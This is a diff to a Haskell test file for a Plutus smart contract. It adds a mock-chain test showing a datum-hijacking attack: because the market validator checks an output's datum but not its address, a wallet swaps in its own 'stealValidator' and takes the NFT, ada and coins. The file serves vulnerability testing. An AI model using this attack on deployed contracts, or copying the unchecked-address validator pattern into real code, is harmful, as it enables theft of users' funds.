@@ -17,7 +17,7 @@ import qualified PlutusTx.AssocMap as AssocMap
 import PlutusTx.Prelude
 import Test.Hspec
 
-import Stealer
+import MarketMaker.DatumHijacking
 
 -- Parameters of the test runs
 
@@ -195,18 +195,16 @@ run1 = do
     -- coin to give back.
     marketSellTx (wallet 2) (MarketTxParams 1250 1 250 45) runParams
 
--- Test spec
-spec :: Spec
-spec = do
-  it "succeeds on the example run" $ do
-    run1 `shouldSatisfy` maybe False isRight
-
+-- We instantiate the datum hijacking contract to exploit the fact that
+-- checks are done on the datum of the contract instead of the address of it.
 stealValidator :: TScripts.TypedValidator Stealer
 stealValidator = stealerValidator $ StealerParams (walletPKHash $ wallet 1)
 
--- | Example run
-run2 :: Maybe (Either MockChainError ((), UtxoState))
-run2 = do
+-- | Since the 'marketValidator' only checks that there is an output with the expected datum,
+-- without any checks on the address of this output,
+-- anyone can substitute the marketmaker by the script they like.
+datumHijacking :: Maybe (Either MockChainError ((), UtxoState))
+datumHijacking = do
   marketValidator <- mMarketValidator
   policy <- mPolicy
   nftAssetClass <- mNftAssetClass
@@ -215,17 +213,17 @@ run2 = do
   let runParams = RunParams marketValidator policy nftAssetClass coinsAssetClass
 
   return . runMockChain $ do
-    -- Transaction 0: minting
-    -- Wallet 1 mints the nft and coins and shares it among the market and wallet 2
+    -- The transaction 0 is the same as in the previos example.
+    -- Wallet 1 mints the NFT and the coins and shares it.
     marketMiningTx (wallet 1) (wallet 2) runParams
 
-    [(out,dat)] <- scriptUtxosSuchThat marketValidator (\_ _ -> True)
+    [(out, dat)] <- scriptUtxosSuchThat marketValidator (\_ _ -> True)
 
     let ada = Ada.lovelaceValueOf
     let coins = Value.assetClassValue coinsAssetClass
     let oneNft = Value.assetClassValue nftAssetClass 1
 
-    -- We take advantage of a purchase of golden coins to inject our validator instead of the original marketmaker one.
+    -- We take advantage of a purchase of golden coins to inject our 'stealValidator' instead of the original 'marketValidator' one.
     validateTxFromSkeleton $
       TxSkel
         (wallet 1)
@@ -234,7 +232,7 @@ run2 = do
         , PaysPK (walletPKHash (wallet 1)) (coins 10)
         ]
 
-    [(outS,datS)] <- scriptUtxosSuchThat stealValidator (\_ _ -> True)
+    [(outS, datS)] <- scriptUtxosSuchThat stealValidator (\_ _ -> True)
 
     -- Now, everything belongs to the wallet 1, who can easily harvest the loot.
     validateTxFromSkeleton $
@@ -243,3 +241,11 @@ run2 = do
         [ SpendsScript stealValidator () (outS, datS)
         , PaysPK (walletPKHash (wallet 1)) (oneNft <> ada 1000 <> coins 40)
         ]
+
+-- Test spec
+spec :: Spec
+spec = do
+  it "succeeds on the example run" $ do
+    run1 `shouldSatisfy` maybe False isRight
+  it "is possible to hijack datum" $ do
+    datumHijacking `shouldSatisfy` maybe False isRight
